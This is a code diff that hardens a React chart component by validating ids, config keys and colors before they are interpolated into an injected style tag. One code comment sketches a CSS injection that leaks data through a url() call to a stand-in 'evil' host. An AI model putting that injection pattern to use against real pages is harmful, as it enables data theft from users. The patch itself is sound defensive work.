@@ -58,10 +58,20 @@ const ChartContainer = React.forwardRef<
 });
 ChartContainer.displayName = "Chart";
 
+// Sanitizers for values that get interpolated into a <style> tag via
+// dangerouslySetInnerHTML. shadcn's stock implementation trusts these
+// strings; we restrict them to safe alphabets so a future caller passing
+// user input as `id`, config key, or color can't break out of the CSS
+// selector / declaration to inject arbitrary rules (which can exfiltrate
+// data via `--x: url('https://evil/?'+leaked)` in modern browsers).
+const isSafeCssIdent = (s: string): boolean => /^[a-zA-Z0-9_-]{1,64}$/.test(s);
+const isSafeCssColor = (s: string): boolean =>
+  /^(#[0-9a-fA-F]{3,8}|rgba?\([\d\s,.%/]+\)|hsla?\([\d\s,.%/]+\)|[a-zA-Z]{3,32}|var\(--[a-zA-Z0-9_-]{1,64}\))$/.test(s);
+
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
   const colorConfig = Object.entries(config).filter(([_, config]) => config.theme || config.color);
 
-  if (!colorConfig.length) {
+  if (!colorConfig.length || !isSafeCssIdent(id)) {
     return null;
   }
 
@@ -75,7 +85,8 @@ ${prefix} [data-chart=${id}] {
 ${colorConfig
   .map(([key, itemConfig]) => {
     const color = itemConfig.theme?.[theme as keyof typeof itemConfig.theme] || itemConfig.color;
-    return color ? `  --color-${key}: ${color};` : null;
+    if (!color || !isSafeCssIdent(key) || !isSafeCssColor(color)) return null;
+    return `  --color-${key}: ${color};`;
   })
   .join("\n")}
 }
